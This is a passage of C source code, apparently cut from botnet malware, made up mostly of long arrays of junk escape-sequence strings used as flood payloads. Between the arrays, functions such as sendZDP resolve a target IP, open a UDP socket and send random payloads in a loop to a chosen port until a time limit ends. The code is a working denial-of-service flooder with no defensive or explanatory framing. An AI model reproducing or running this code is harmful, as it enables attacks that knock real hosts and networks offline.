26\\x323\\x329\\x35a\\x34d\\x359\\x345\\x324\\x35a\\x6b\\x337\\x33f\\x341\\x33f\\x35a\\x323\\x32c\\x322\\x321\\x327\\x326\\x32e\\x32a\\x349\\x33c\\x61\\x338\\x30c\\x311\\x302\\x35d\\x341\\x30b\\x360\\x304\\x358\\x303\\x312\\x33e\\x34a\\x35a\\x68\\x338\\x34b\\x31a\\x307\\x350\\x302\\x331\\x354\\x331\\x32c\\x325\\x319\\x31f\\x31e\\x66\\x338\\x314\\x312\\x340\\x31a\\x32d\\x317\\x329\\x33b\\x345\\x317\\x322\\x325\\x356\\x32d\\x330\\x353\\x317\\x359\\x66\\x335\\x351\\x306\\x350\\x315\\x308\\x35d\\x343\\x35d\\x31a\\x343\\x35d\\x30e\\x34a\\x330\\x32a\\x33a\\x332\\x319\\x326\\x32b\\x332\\x323\\x331\\x31e\\x318\\x354\\x61\\x334\\x35d\\x344\\x306\\x314\\x300\\x346\\x33d\\x350\\x30b\\x302\\x346\\x33a\\x345\\x31e\\x354\\x320\\x324\\x325\\x345\\x359\\x317\\x325\\x34e\\x33a\\x66\\x335\\x307\\x315\\x33b\\x326\\x325\\x64\\x337\\x35d\\x346\\x30c\\x344\\x35d\\x31b\\x340\\x308\\x30a\\x315\\x353\\x324\\x2c\\x337\\x340\\x31e\\x322\\x326\\x73\\x334\\x360\\x31b\\x313\\x357\\x312\\x31b\\x33d\\x305\\x350\\x34c\\x33d\\x315\\x327\\x32f\\x31e\\x330\\x31d\\x32c\\x32b\\x33c\\x32b\\x333\\x35c\\x349\\x318\\x73\\x336\\x360\\x304\\x309\\x33f\\x31b\\x357\\x340\\x341\\x302\\x306\\x32a\\x349\\x320\\x355\\x32c\\x32b\\x317\\x6b\\x338\\x34a\\x360\\x301\\x304\\x326\\x32f\\x33b\\x321\\x31c\\x332\\x331\\x64\\x334\\x30d\\x30a\\x311\\x30e\\x350\\x313\\x312\\x341\\x305\\x35d\\x329\\x318\\x73\\x338\\x303\\x35d\\x311\\x350\\x355\\x31f\\x333\\x327\\x324\\x31f\\x339\\x327\\x347\\x332\\x326\\x61\\x338\\x311\\x35d\\x313\\x344\\x312\\x306\\x30b\\x30e\\x351\\x311\\x30e\\x308\\x31b\\x343\\x346\\x32b\\x339\\x31c\\x67\\x337\\x304\\x309\\x30a\\x344\\x30e\\x300\\x312\\x342\\x332\\x35a\\x32e\\x31c\\x331\\x328\\x324\\x31f\\x326\\x31c\\x331\\x66\\x337\\x35b\\x319\\x34d\\x320\\x65\\x337\\x360\\x35b\\x33e\\x30a\\x30e\\x342\\x30e\\x31e\\x353\\x322\\x359\\x32b\\x33b\\x34e\\x31c\\x355\\x349\\x33a\\x32b\\x31c\\x32e\\x35c\\x6c\\x335\\x351\\x35d\\x302\\x309\\x343\\x301\\x351\\x344\\x310\\x313\\x303\\x306\\x303\\x353\\x353\\x327\\x332\\x339\\x32f\\x33a\\x327\\x66\\x335\\x358\\x314\\x35d\\x346\\x332\\x317\\x355\\x35a\\x321\\x33c\\x330\\x324\\x33c\\x32b\\x71\\x336\\x314\\x314\\x310\\x341\\x30e\\x35b\\x343\\x300\\x357\\x35d\\x35d\\x32f\\x354\\x349\\x354\\x356\\x35c\\x353\\x359\\x332\\x32b\\x31c\\x77\\x337\\x302\\x35b\\x352\\x31b\\x30c\\x30a\\x307\\x35d\\x313\\x344\\x30c\\x358\\x30d\\x315\\x359\\x353\\x31f\\x69\\x336\\x35b\\x351\\x30c\\x34c\\x35d\\x315\\x35d\\x305\\x309\\x300\\x344\\x31a\\x352\\x300\\x33e\\x327\\x348\\x32f\\x332\\x323\\x68\\x336\\x344\\x31a\\x30f\\x358\\x350\\x30f\\x35d\\x342\\x323\\x317\\x354\\x31f\\x31d\\x333\\x339\\x331\\x348\\x326\\x66\\x335\\x344\\x310\\x341\\x304\\x34c\\x301\\x312\\x342\\x35b\\x300\\x34b\\x344\\x313\\x341\\x32d\\x328\\x33c\\x32b\\x31f\\x353\\x73\\x338\\x31b\\x344\\x352\\x33f\\x340\\x30e\\x34a\\x342\\x340\\x34c\\x348\\x322\\x317\\x34d\\x324\\x32b\\x339\\x6c\\x337\\x360\\x327\\x332\\x347\\x34d\\x34d\\x347\\x356\\x34d\\x33b\\x33b\\x354\\x32f\\x31d\\x35a\\x6b\\x337\\x311\\x33a\\x31f\\x323\\x33c\\x330\\x349\\x345\\x333\\x33b\\x316\\x322\\x332\\x325\\x61\\x337\\x344\\x358\\x328\\x333\\x330\\x317\\x68\\x335\\x341\\x303\\x321\\x31f\\x332\\x34e\\x354\\x356\\x318\\x325\\x355\\x66\\x335\\x301\\x30a\\x33d\\x311\\x35d\\x312\\x30f\\x346\\x34e\\x339\\x32b\\x354\\x349\\x348\\x34d\\x66\\x335\\x31b\\x33f\\x312\\x339\\x31f\\x33b\\x35c\\x339\\x327\\x34e\\x61\\x338\\x33e\\x30c\\x30d\\x35d\\x342\\x34c\\x358\\x34a\\x351\\x358\\x33f\\x32e\\x66\\x335\\x342\\x360\\x33d\\x305\\x31b\\x309\\x31a\\x350\\x31a\\x351\\x341\\x30f\\x316\\x359\\x64\\x334\\x341\\x311\\x31a\\x307\\x35d\\x35d\\x35d\\x300\\x30f\\x315\\x348\\x317\\x323\\x34e\\x347\\x355\\x32f\\x2c\\x338\\x313\\x311\\x30f\\x351\\x33e\\x306\\x34c\\x313\\x313\\x309\\x34c\\x340\\x321\\x356\\x34d\\x35c\\x31c\\x349\\x348\\x31d\\x354\\x73\\x336\\x306\\x304\\x33e\\x34c\\x357\\x306\\x344\\x35a\\x339\\x31c\\x327\\x349\\x31d\\x322\\x325\\x353\\x329\\x319\\x318\\x323\\x35a\\x73\\x336\\x307\\x343\\x312\\x30c\\x310\\x312\\x310\\x327\\x31f\\x324\\x31e\\x31e\\x31e\\x33c\\x35c\\x6b\\x335\\x312\\x33f\\x305\\x30d\\x30a\\x316\\x64\\x334\\x344\\x344\\x305\\x313\\x346\\x30b\\x303\\x346\\x32e\\x333\\x321\\x33a\\x353\\x31f\\x354\\x320\\x34e\\x73\\x334\\x30f\\x357\\x34a\\x304\\x342\\x35d\\x314\\x312\\x344\\x358\\x327\\x329\\x320\\x354\\x32f\\x35c\\x32f\\x61\\x334\\x315\\x312\\x313\\x352\\x352\\x341\\x35d\\x35d\\x35a\\x319\\x326\\x33c\\x33c\\x322\\x67\\x337\\x314\\x344\\x313\\x352\\x306\\x33f\\x360\\x35d\\x340\\x303\\x34e\\x317\\x66\\x338\\x314\\x340\\x350\\x346\\x351\\x33d\\x31a\\x313\\x30b\\x303\\x314\\x341\\x324\\x33c\\x31d\\x349\\x324\\x327\\x35c\\x35c\\x348\\x318\\x355\\x355\\x33c\\x317\\x348\\x65\\x336\\x350\\x300\\x304\\x32a\\x353\\x323\\x33c\\x328\\x326\\x32e\\x32b\\x31f\\x31d\\x32b\\x6c\\x337\\x30f\\x30f\\x350\\x360\\x31a\\x344\\x330\\x359\\x323\\x35c\\x33a\\x32a\\x324\\x31e\\x325\\x330\\x333\\x32d\\x353\\x66\\x335\\x35d\\x35b\\x30c\\x35d\\x30b\\x312\\x344\\x320\\x321\\x354\\x71\\x334\\x313\\x34c\\x35b\\x34b\\x352\\x34b\\x30f\\x332\\x355\\x332\\x32e\\x77\\x336\\x305\\x350\\x34b\\x31b\\x309\\x302\\x33f\\x34b\\x308\\x356\\x327\\x326\\x32a\\x34d\\x328\\x328\\x354\\x345\\x35a\\x33b\\x69\\x338\\x305\\x309\\x302\\x341\\x34c\\x302\\x302\\x342\\x346\\x31b\\x30f\\x313\\x32c\\x35a\\x322\\x31f\\x319\\x353\\x31d\\x347\\x324\\x68\\x338\\x34b\\x327\\x323\\x34e\\x66\\x338\\x30e\\x344\\x340\\x33d\\x30b\\x30d\\x309\\x340\\x305\\x315\\x331\\x32c\\x31e\\x318\\x32e\\x332\\x347\\x32a\\x316\\x317\\x324\\x32c\\x347\\x35c\\x73\\x336\\x33e\\x340\\x311\\x303\\x34c\\x360\\x321\\x6c\\x334\\x30a\\x360\\x31a\\x358\\x315\\x305\\x351\\x313\\x344\\x305\\x33b\\x31e\\x31d\\x325\\x320\\x354\\x321\\x33a\\x324\\x339\\x32b\\x333\\x35a\\x6b\\x336\\x341\\x307\\x306\\x30d\\x313\\x302\\x30b\\x302\\x312\\x340\\x33c\\x347\\x330\\x331\\x324\\x354\\x329\\x31c\\x319\\x32d\\x61\\x334\\x360\\x312\\x354\\x349\\x33b\\x339\\x35c\\x318\\x32c\\x32c\\x32d\\x33b\\x68\\x337\\x302\\x301\\x30c\\x30d\\x34a\\x34b\\x342\\x312\\x307\\x30b\\x316\\x339\\x31f\\x349\\x356\\x32b\\x339\\x356\\x349\\x332\\x321\\x317\\x34d\\x66\\x335\\x344\\x33e\\x312\\x346\\x34b\\x33d\\x31b\\x311\\x314\\x30f\\x344\\x358\\x359\\x353\\x327\\x326\\x33c\\x332\\x66\\x335\\x344\\x31a\\x306\\x359\\x35a\\x35a\\x61\\x338\\x309\\x33f\\x343\\x344\\x346\\x34c\\x34c\\x30e\\x35d\\x343\\x360\\x358\\x307\\x35d\\x32b\\x327\\x348\\x339\\x31d\\x31e\\x348\\x359\\x322\\x66\\x335\\x358\\x30f\\x30b\\x340\\x35b\\x342\\x341\\x305\\x324\\x353\\x64\\x335\\x35d\\x34b\\x34d\\x32d\\x345\\x323\\x333\\x32c\\x354\\x333\\x33c\\x345\\x348\\x35c\\x331\\x331\\x32e\\x2c\\x336\\x303\\x305\\x346\\x304\\x342\\x309\\x352\\x346\\x303\\x351\\x346\\x343\\x350\\x32f\\x31e\\x320\\x32a\\x345\\x33b\\x345\\x316\\x73\\x338\\x360\\x340\\x357\\x358\\x35d\\x360\\x344\\x346\\x307\\x307\\x341\\x35b\\x352\\x342\\x32a\\x320\\x32d\\x33c\\x31e\\x354\\x359\\x324\\x319\\x355\\x339\\x73\\x335\\x33f\\x313\\x33d\\x324\\x328\\x34e\\x353\\x31c\\x6b\\x335\\x351\\x357\\x305\\x307\\x30f\\x30e\\x307\\x309\\x314\\x30e\\x30f\\x344\\x341\\x30f\\x33e\\x319\\x316\\x35c\\x32d\\x329\\x31c\\x330\\x64\\x336\\x304\\x30c\\x34b\\x34c\\x33e\\x35d\\x326\\x330\\x320\\x354\\x32a\\x353\\x32b\\x332\\x73\\x335\\x344\\x34a\\x306\\x309\\x34c\\x340\\x350\\x306\\x34b\\x350\\x30e\\x360\\x30d\\x309\\x340\\x355\\x31f\\x327\\x32e\\x319\\x347\\x31e\\x319\\x333\\x317\\x31e\\x332\\x61\\x334\\x343\\x348\\x67\\x337\\x304\\x350\\x30b\\x340\\x306\\x34a\\x304\\x35b\\x305\\x30d\\x34a\\x33e\\x30e\\x30b\\x304\\x32f\\x32e\\x355\\x329\\x66\\x334\\x34a\\x34c\\x34d\\x348\\x325\\x65\\x338\\x30c\\x34c\\x351\\x352\\x358\\x327\\x31e\\x331\\x33c\\x32a\\x324\\x332\\x329\\x331\\x332\\x33a\\x320\\x332\\x327\\x328\\x6c\\x336\\x341\\x358\\x301\\x344\\x30a\\x352\\x34a\\x344\\x35c\\x330\\x328\\x355\\x34e\\x359\\x32f\\x32a\\x32e\\x33b\\x32d\\x66\\x336\\x310\\x312\\x309\\x351\\x325\\x331\\x359\\x339\\x317\\x331\\x71\\x335\\x358\\x314\\x341\\x343\\x311\\x312\\x308\\x312\\x330\\x353\\x33a\\x330\\x35c\\x31c\\x32c\\x316\\x32b\\x328\\x32e\\x35a\\x356\\x330\\x77\\x335\\x33d\\x346\\x346\\x315\\x301\\x310\\x33e\\x355\\x322\\x318\\x322\\x347\\x330\\x354\\x348\\x353\\x324\\x316\\x69\\x337\\x342\\x342\\x31a\\x323\\x32f\\x325\\x345\\x31f\\x327\\x68\\x336\\x340\\x311\\x301\\x305\\x306\\x33d\\x33e\\x358\\x31b\\x35d\\x343\\x315\\x31e\\x31f\\x348\\x345\\x31f\\x31e\\x359\\x66\\x334\\x30e\\x34a\\x340\\x35d\\x302\\x31b\\x33d\\x31b\\x345\\x329\\x31f\\x32c\\x34e\\x31f\\x32f\\x73\\x334\\x340\\x33f\\x33e\\x302\\x32d\\x345\\x318\\x34e\\x321\\x328\\x35a\\x32a\\x34e\\x35a\\x32c\\x329\\x316\\x331\\x6c\\x337\\x30b\\x35b\\x34b\\x34a\\x314\\x30d\\x33e\\x351\\x358\\x30c\\x34b\\x30e\\x319\\x319\\x316\\x330\\x348\\x348\\x6b\\x334\\x357\\x32a\\x61\\x336\\x300\\x346\\x35b\\x358\\x34b\\x324\\x327\\x32e\\x34d\\x330\\x326\\x328\\x32c\\x35c\\x349\\x31e\\x31c\\x333\\x328\\x347\\x68\\x336\\x342\\x35b\\x344\\x30a\\x341\\x341\\x300\\x30d\\x30a\\x30d\\x30f\\x313\\x31e\\x35a\\x339\\x32d\\x320\\x356\\x32e\\x32d\\x353\\x32c\\x66\\x338\\x303\\x35d\\x34b\\x360\\x35b\\x34c\\x341\\x30c\\x344\\x30a\\x321\\x32a\\x33b\\x32e\\x35a\\x66\\x334\\x33e\\x34a\\x35b\\x360\\x348\\x359\\x33a\\x348\\x347\\x356\\x31e\\x32b\\x61\\x338\\x341\\x357\\x346\\x314\\x341\\x310\\x351\\x312\\x305\\x31b\\x304\\x312\\x309\\x351\\x35b\\x35c\\x328\\x328\\x31c\\x327\\x66\\x337\\x303\\x343\\x358\\x35d\\x34e\\x319\\x320\\x339\\x34d\\x345\\x353\\x31e\\x328\\x348\\x31c\\x64\\x334\\x306\\x34c\\x343\\x34b\\x310\\x306\\x301\\x35d\\x35d\\x357\\x358\\x35b\\x32a\\x33c\\x318\\x332\\x33b\\x331\\x34d\\x32a\\x356\\x328\\x359\\x331\\x2c\\x334\\x35d\\x342\\x301\\x31b\\x33b\\x73\\x338\\x30b\\x350\\x35d\\x30e\\x351\\x312\\x33d\\x307\\x358\\x313\\x35d\\x30f\\x33f\\x311\\x351\\x31c\\x333\\x323\\x348\\x317\\x327\\x33b\\x32b\\x319\\x73\\x334\\x311\\x30a\\x331\\x322\\x32f\\x6b\\x334\\x311\\x304\\x301\\x352\\x34b\\x315\\x30e\\x304\\x344\\x33e\\x30e\\x303\\x344\\x305\\x357\\x332\\x319\\x32d\\x33a\\x359\\x33c\\x324\\x353\\x330\\x347\\x35c\\x332\\x332\\x329\\x64\\x337\\x340\\x34c\\x344\\x342\\x311\\x34b\\x33f\\x308\\x34c\\x310\\x34b\\x327\\x332\\x321\\x73\\x338\\x352\\x350\\x34c\\x33d\\x35d\\x357\\x313\\x360\\x35c\\x319\\x324\\x33c\\x32f\\x318\\x31d\\x332\\x61\\x337\\x302\\x309\\x34b\\x30b\\x306\\x360\\x305\\x343\\x306\\x34c\\x304\\x30f\\x30f\\x346\\x33a\\x31e\\x32b\\x356\\x34d\\x326\\x31d\\x33a\\x349\\x33a\\x327\\x67\\x336\\x304\\x34b\\x344\\x320\\x31e\\x353\\x339\\x66\\x338\\x33d\\x309\\x33e\\x301\\x33d\\x30c\\x318\\x33a\\x345\\x318\\x333\\x35a\\x318\\x316\\x33c\\x31e\\x31c\\x65\\x335\\x33e\\x34a\\x314\\x357\\x360\\x34c\\x35d\\x306\\x34a\\x340\\x305\\x340\\x315\\x324\\x32c\\x353\\x6c\\x336\\x340\\x30e\\x31a\\x306\\x305\\x35d\\x307\\x30a\\x30b\\x34c\\x346\\x341\\x309\\x344\\x35d\\x325\\x34e\\x66\\x334\\x30c\\x302\\x31a\\x30f\\x359\\x32a\\x328\\x32b\\x347\\x329\\x321\\x33a\\x356\\x328\\x331\\x71\\x335\\x350\\x305\\x352\\x300\\x30d\\x30c\\x33d\\x346\\x34b\\x30f\\x30e\\x314\\x303\\x327\\x320\\x319\\x329\\x32a\\x347\\x323\\x31f\\x347\\x323\\x31d\\x329\\x77\\x336\\x35d\\x310\\x344\\x314\\x35a\\x326\\x32f\\x349\\x322\\x349\\x35c\\x325\\x330\\x356\\x31d\\x35a\\x345\\x320\\x317\\x69\\x335\\x360\\x344\\x351\\x309\\x34b\\x349\\x32a\\x327\\x32a\\x326\\x32e\\x32b\\x35a\\x339\\x32b\\x317\\x349\\x317\\x68\\x335\\x30c\\x350\\x344\\x357\\x310\\x342\\x309\\x344\\x30c\\x309\\x32c\\x66\\x337\\x308\\x30f\\x34b\\x302\\x30c\\x309\\x351\\x30b\\x344\\x30a\\x310\\x358\\x325\\x327\\x319\\x34d\\x32f\\x332\\x320\\x34e\\x31f\\x31e\\x355\\x327\\x31f\\x32c\\x73\\x336\\x310\\x344\\x304\\x341\\x344\\x317\\x353\\x6c\\x338\\x343\\x315\\x33d\\x333\\x319\\x34d\\x31e\\x31c\\x321\\x330\\x33a\\x330\\x34e\\x317\\x318\\x345\\x6b\\x338\\x307\\x303\\x345\\x31f\\x31f\\x61\\x337\\x30e\\x30e\\x30e\\x358\\x351\\x309\\x30d\\x35d\\x352\\x30e\\x34b\\x30b\\x310\\x304\\x316\\x329\\x31c\\x35a\\x321\\x32a\\x323\\x354\\x321\\x348\\x32e\\x68\\x338\\x33e\\x314\\x312\\x307\\x300\\x341\\x33e\\x30d\\x344\\x350\\x311\\x301\\x34c\\x302\\x32e\\x355\\x333\\x356\\x31d\\x319\\x325\\x66\\x337\\x344\\x30c\\x33f\\x30d\\x300\\x342\\x34c\\x351\\x311\\x344\\x31a\\x350\\x313\\x35c\\x317\\x355\\x33a\\x359\\x327\\x66\\x335\\x344\\x34b\\x35d\\x30c\\x33e\\x34a\\x31a\\x322\\x333\\x33c\\x325\\x61\\x338\\x304\\x31a\\x34c\\x329\\x324\\x33c\\x353\\x329\\x329\\x32f\\x332\\x318\\x32e\\x33b\\x331\\x66\\x334\\x30b\\x309\\x351\\x312\\x30e\\x314\\x30a\\x35d\\x35d\\x346\\x301\\x301\\x351\\x30f\\x358\\x329\\x33a\\x318\\x332\\x320\\x359\\x349\\x348\\x324\\x324\\x64\\x337\\x305\\x309\\x308\\x312\\x306\\x315\\x34a\\x314\\x309\\x35d\\x311\\x332\\x339\\x31d\\x321\\x318\\x319\\x330\\x34e\\x318\\x31d\\x2c\\x334\\x30b\\x310\\x344\\x30d\\x324\\x331\\x349\\x348\\x33c\\x31f\\x73\\x334\\x340\\x341\\x343\\x340\\x300\\x30d\\x304\\x344\\x352\\x31e\\x359\\x73\\x337\\x304\\x30d\\x33c\\x355\\x31d\\x316\\x347\\x34d\\x326\\x347\\x353\\x321\\x35a\\x353\\x6b\\x337\\x30e\\x30e\\x35d\\x342\\x310\\x301\\x308\\x302\\x352\\x341\\x30f\\x32f\\x32d\\x333\\x330\\x330\\x347\\x35a\\x339\\x318\\x33a\\x33a\\x316\\x64\\x336\\x344\\x302\\x310\\x340\\x352\\x349\\x31f\\x339\\x325\\x339\\x316\\x356\\x359\\x321\\x329\\x356\\x73\\x338\\x304\\x311\\x31b\\x33e\\x332\\x34e\\x31d\\x355\\x31f\\x31e\\x328\\x326\\x316\\x355\\x61\\x336\\x33d\\x33e\\x30d",
            "\\x334\\x30f\\x33e\\x308\\x341\\x351\\x309\\x309\\x309\\x304\\x31b\\x31a\\x35c\\x34e\\x32e\\x354\\x330\\x332\\x31f\\x320\\x339\\x31d\\x66\\x335\\x305\\x31e\\x345\\x331\\x331\\x320\\x347\\x330\\x323\\x347\\x31c\\x317\\x31d\\x331\\x319\\x73\\x338\\x35b\\x31a\\x31b\\x360\\x35b\\x33e\\x352\\x306\\x302\\x350\\x30b\\x352\\x344\\x323\\x349\\x31d\\x356\\x320\\x31c\\x328\\x353\\x333\\x323\\x332\\x6c\\x334\\x303\\x300\\x301\\x341\\x344\\x310\\x34b\\x30d\\x324\\x6b\\x335\\x35d\\x357\\x31b\\x35d\\x302\\x351\\x319\\x34d\\x326\\x345\\x32d\\x330\\x32e\\x320\\x328\\x324\\x339\\x333\\x61\\x335\\x34c\\x32a\\x331\\x359\\x31d\\x35a\\x35a\\x318\\x33c\\x325\\x333\\x332\\x328\\x33b\\x31f\\x68\\x334\\x358\\x308\\x303\\x31b\\x31b\\x341\\x35b\\x344\\x33a\\x66\\x335\\x341\\x310\\x35d\\x313\\x32a\\x331\\x330\\x326\\x66\\x334\\x304\\x350\\x30f\\x33d\\x308\\x300\\x340\\x312\\x305\\x33e\\x33f\\x314\\x342\\x332\\x330\\x324\\x354\\x323\\x329\\x323\\x31c\\x61\\x334\\x30a\\x331\\x325\\x32c\\x332\\x316\\x32b\\x356\\x355\\x33c\\x317\\x32f\\x32e\\x66\\x334\\x34c\\x313\\x33f\\x34e\\x356\\x355\\x328\\x323\\x347\\x35c\\x64\\x337\\x311\\x306\\x301\\x358\\x307\\x349\\x325\\x321\\x2c\\x336\\x35b\\x32d\\x345\\x319\\x332\\x332\\x32c\\x34d\\x356\\x325\\x329\\x33b\\x73\\x336\\x352\\x342\\x33e\\x342\\x352\\x343\\x31d\\x32b\\x319\\x32e\\x318\\x359\\x33a\\x327\\x73\\x337\\x35d\\x308\\x34b\\x346\\x311\\x306\\x33e\\x358\\x30d\\x30a\\x308\\x319\\x32f\\x327\\x33a\\x31e\\x35a\\x32f\\x320\\x333\\x6b\\x335\\x35b\\x31a\\x315\\x343\\x300\\x350\\x34c\\x303\\x32a\\x35a\\x320\\x359\\x35c\\x35a\\x353\\x317\\x356\\x319\\x356\\x32c\\x32e\\x64\\x336\\x344\\x306\\x300\\x34c\\x309\\x30e\\x350\\x30c\\x343\\x350\\x30f\\x314\\x30f\\x34a\\x30a\\x345\\x31f\\x34d\\x349\\x31d\\x32f\\x339\\x33a\\x73\\x337\\x305\\x310\\x30d\\x306\\x312\\x302\\x300\\x31a\\x341\\x34a\\x319\\x359\\x328\\x32b\\x324\\x355\\x330\\x61\\x335\\x306\\x304\\x343\\x30d\\x358\\x30b\\x303\\x344\\x30c\\x31e\\x67\\x337\\x30a\\x351\\x31a\\x309\\x315\\x304\\x35b\\x330\\x66\\x335\\x306\\x341\\x30a\\x314\\x308\\x360\\x360\\x32e\\x349\\x349\\x347\\x331\\x"
         
         };
        if (a >= 50){
            hexstring = randstrings[rand() % (sizeof(randstrings) / sizeof(char *))];
            send(std_hex, hexstring, std_packets, 0);
            connect(std_hex,(struct sockaddr *) &sin, sizeof(sin));
            if (time(NULL) >= start + secs)
            {
                close(std_hex);
                _exit(0);
            }
            a = 0;
        }
        a++;
    }
}
void sendZDP(unsigned char *ip, int port, int secs){
    int std_hex;
    std_hex = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;
    int rport;
    unsigned char *hexstring = malloc(1024);
    memset(hexstring, 0, 1024);
    hp = gethostbyname(ip);
    bzero((char*) &sin,sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = port;
    unsigned int a = 0;
    while(1){
        char * randstrings[] = {
            "\\x336\\x352\\x311\\x314\\x33f\\x30f\\x346\\x33e\\x30e\\x30f\\x357\\x35d\\x35b\\x344\\x300\\x304\\x324\\x318\\x322\\x32b\\x317\\x328\\x32f\\x355\\x6c\\x338\\x31b\\x34a\\x307\\x355\\x348\\x333\\x318\\x359\\x31f\\x32c\\x356\\x355\\x359\\x66\\x337\\x31a\\x344\\x30b\\x358\\x301\\x326\\x71\\x334\\x34b\\x30f\\x30f\\x304\\x32d\\x316\\x33a\\x347\\x320\\x359\\x32a\\x35c\\x355\\x33b\\x31f\\x332\\x33b\\x77\\x336\\x306\\x344\\x312\\x342\\x313\\x353\\x355\\x31f\\x326\\x354\\x35a\\x69\\x337\\x302\\x350\\x31a\\x344\\x304\\x305\\x308\\x343\\x341\\x300\\x307\\x319\\x31f\\x33c\\x332\\x32b\\x348\\x329\\x34e\\x348\\x339\\x347\\x68\\x335\\x300\\x312\\x343\\x309\\x34a\\x35b\\x309\\x312\\x358\\x346\\x32f\\x354\\x329\\x31c\\x66\\x338\\x35b\\x353\\x348\\x319\\x316\\x322\\x328\\x33c\\x35c\\x332\\x73\\x335\\x310\\x308\\x331\\x320\\x31f\\x326\\x6c\\x336\\x34a\\x312\\x34b\\x360\\x30d\\x31c\\x33c\\x31d\\x349\\x322\\x359\\x32b\\x316\\x324\\x318\\x354\\x328\\x318\\x6b\\x337\\x31b\\x315\\x310\\x302\\x34c\\x305\\x343\\x30f\\x310\\x340\\x32a\\x316\\x31e\\x32e\\x320\\x319\\x325\\x31c\\x61\\x334\\x33e\\x331\\x333\\x353\\x33c\\x328\\x326\\x32b\\x68\\x336\\x33e\\x350\\x34b\\x342\\x32d\\x325\\x66\\x336\\x300\\x30a\\x30d\\x35d\\x344\\x31a\\x307\\x342\\x30f\\x300\\x34b\\x312\\x33e\\x306\\x352\\x32c\\x349\\x348\\x354\\x355\\x34e\\x32c\\x317\\x355\\x329\\x339\\x33c\\x66\\x334\\x315\\x34b\\x308\\x357\\x307\\x30e\\x342\\x342\\x342\\x30d\\x300\\x322\\x319\\x61\\x336\\x346\\x30a\\x33f\\x31c\\x332\\x323\\x321\\x32f\\x66\\x336\\x34c\\x309\\x303\\x346\\x303\\x33f\\x342\\x305\\x35b\\x358\\x343\\x311\\x313\\x308\\x32e\\x353\\x353\\x31d\\x316\\x345\\x64\\x337\\x30b\\x303\\x344\\x31a\\x352\\x30b\\x346\\x316\\x316\\x32c\\x347\\x318\\x356\\x322\\x332\\x31c\\x35c\\x322\\x326\\x2c\\x337\\x346\\x306\\x344\\x357\\x30a\\x341\\x314\\x344\\x31a\\x323\\x325\\x326\\x348\\x31c\\x332\\x73\\x335\\x344\\x310\\x303\\x302\\x314\\x315\\x35d\\x301\\x344\\x305\\x356\\x32c\\x32c\\x345\\x354\\x33b\\x32e\\x321\\x73\\x336\\x30e\\x30e\\x342\\x34b\\x34d\\x34d\\x32a\\x339\\x6b\\x337\\x31a\\x340\\x33e\\x307\\x304\\x31a\\x313\\x342\\x308\\x302\\x303\\x326\\x34e",
            "\\x31e\\x64\\x337\\x30b\\x33d\\x360\\x300\\x31b\\x35b\\x312\\x34a\\x351\\x309\\x308\\x30e\\x352\\x35c\\x317\\x31f\\x33a\\x73\\x336\\x309\\x308\\x33d\\x313\\x353\\x32f\\x320\\x32c\\x31f\\x61\\x334\\x314\\x319\\x325\\x33a\\x33c\\x327\\x328\\x325\\x34d\\x31c\\x31d\\x67\\x334\\x300\\x344\\x35b\\x344\\x303\\x31b\\x30e\\x305\\x341\\x35a\\x319\\x32c\\x354\\x356\\x345\\x330\\x353\\x330\\x326\\x329\\x66\\x338\\x301\\x34c\\x301\\x341\\x343\\x316\\x353\\x32d\\x65\\x338\\x30f\\x305\\x34d\\x33a\\x319\\x326\\x332\\x32c\\x33a\\x31f\\x32d\\x32e\\x339\\x32c\\x33a\\x326\\x325\\x6c\\x336\\x307\\x301\\x31a\\x360\\x35d\\x315\\x302\\x330\\x31d\\x34e\\x332\\x318\\x322\\x316\\x66\\x334\\x30a\\x35b\\x309\\x34c\\x310\\x347\\x355\\x359\\x33a\\x332\\x345\\x34d\\x31d\\x345\\x322\\x339\\x71\\x335\\x344\\x33d\\x35b\\x30d\\x30f\\x340\\x350\\x341\\x312\\x357\\x35d\\x30a\\x312\\x34b\\x352\\x32e\\x35c\\x31d\\x32c\\x339\\x326\\x321\\x355\\x317\\x33c\\x355\\x345\\x329\\x31c\\x31e\\x77\\x336\\x311\\x314\\x30f\\x350\\x309\\x35b\\x343\\x348\\x35a\\x326\\x349\\x353\\x355\\x321\\x339\\x354\\x349\\x32e\\x348\\x69\\x338\\x306\\x309\\x30c\\x35d\\x331\\x348\\x68\\x338\\x313\\x343\\x32d\\x66\\x336\\x344\\x304\\x305\\x34b\\x300\\x307\\x35d\\x353\\x31c\\x326\\x35a\\x31c\\x324\\x332\\x353\\x325\\x32a\\x347\\x32f\\x322\\x34d\\x73\\x338\\x342\\x358\\x305\\x351\\x360\\x35d\\x343\\x30b\\x35a\\x356\\x31e\\x355\\x6c\\x335\\x346\\x315\\x314\\x321\\x339\\x354\\x319\\x330\\x317\\x6b\\x337\\x300\\x30d\\x351\\x356\\x326\\x330\\x317\\x323\\x35a\\x61\\x338\\x35d\\x34c\\x344\\x352\\x30b\\x356\\x321\\x354\\x347\\x34d\\x31d\\x34d\\x32a\\x345\\x331\\x68\\x337\\x310\\x342\\x360\\x352\\x305\\x351\\x30e\\x33e\\x33d\\x35d\\x301\\x343\\x342\\x346\\x321\\x325\\x31c\\x345\\x354\\x333\\x324\\x35a\\x356\\x323\\x33c\\x339\\x31e\\x318\\x326\\x66\\x338\\x341\\x35d\\x33f\\x350\\x305\\x360\\x306\\x34c\\x300\\x314\\x30e\\x350\\x354\\x32f\\x339\\x324\\x35a\\x347\\x324\\x319\\x353\\x32b\\x327\\x31e\\x348\\x345\\x353\\x66\\x337\\x309\\x34a\\x311\\x311\\x33b\\x347\\x325\\x317\\x32a\\x318\\x61\\x336\\x30b\\x304\\x33d\\x314\\x312\\x30d\\x305\\x340\\x340\\x346\\x344\\x357\\x340\\x35d\\x358\\x355\\x321\\x321\\x32a\\x327\\x349\\x322\\x32b\\x322\\x32f\\x33a\\x66\\x334\\x30a\\x303\\x341\\x35c\\x339\\x347\\x321\\x326\\x64\\x336\\x351\\x31d\\x323\\x320\\x359\\x319\\x34d\\x33c\\x345\\x345\\x339\\x355\\x339\\x347\\x32c\\x35c\\x2c\\x338\\x305\\x352\\x313\\x35d\\x340\\x34b\\x30d\\x307\\x306\\x303\\x310\\x308\\x333\\x359\\x319\\x355\\x35a\\x339\\x32d\\x323\\x345\\x347\\x33b\\x34e\\x347\\x329\\x33a\\x73\\x336\\x305\\x306\\x33d\\x360\\x315\\x33d\\x33c\